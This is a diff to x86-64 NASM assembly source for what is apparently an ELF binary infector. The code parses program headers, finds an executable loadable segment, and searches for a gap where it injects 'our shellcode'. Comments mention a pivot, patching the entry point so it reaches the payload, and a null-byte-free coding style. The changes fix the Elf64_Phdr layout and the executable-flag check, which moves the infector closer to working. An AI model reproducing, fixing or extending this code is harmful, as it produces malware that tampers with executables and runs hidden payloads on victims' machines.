@@ -13,7 +13,7 @@
 
 ; TODO : both filed should be MAP_PRIVATE in mmap:
 ; TODO ommit the null-byte-free coding style on both this version and the 32 bit one
-			; TODO : PROBLEM -> segfault at find_gap
+			; TODO : PROBLEM -> the pivot has a wrong entry point, ot at least doesn't have the payload at the entry point as expected (probably the first case), check with patch_jump_point
 
 STRUC	stat
 	before_size:	resb	48
@@ -53,12 +53,12 @@ ENDSTRUC
 
 STRUC Elf64_Phdr
 	p_type:		resd	1
-	p_offset:	resd	1
+	p_flags:	resd	1
+	p_offset:	resq	1
 	p_vaddr:	resq	1
 	p_paddr:	resq	1
 	p_filesz:	resq	1
 	p_memsz:	resq	1
-	p_flags:	resq	1
 	p_align:	resq	1
 ENDSTRUC
 
@@ -302,7 +302,7 @@ next_segment:
 	je next_segment			; not a loadable segment
 
 	mov edx, [rbx + p_flags]	; checking the segment flags
-	add edx, PF_X
+	and edx, PF_X
 	je next_segment			; not an executable segment
 	
 	jmp segment_found
@@ -315,7 +315,7 @@ no_segment:
 segment_found:
 	; now that we found a target segment, we have to find a suitable gap to store our shellcode
 	mov r11, [pivot_data]
-	mov r12, rbx
+	mov r12, rbx			; the target segment
 	mov r13, [shellcode_size]
 
 	call find_gap
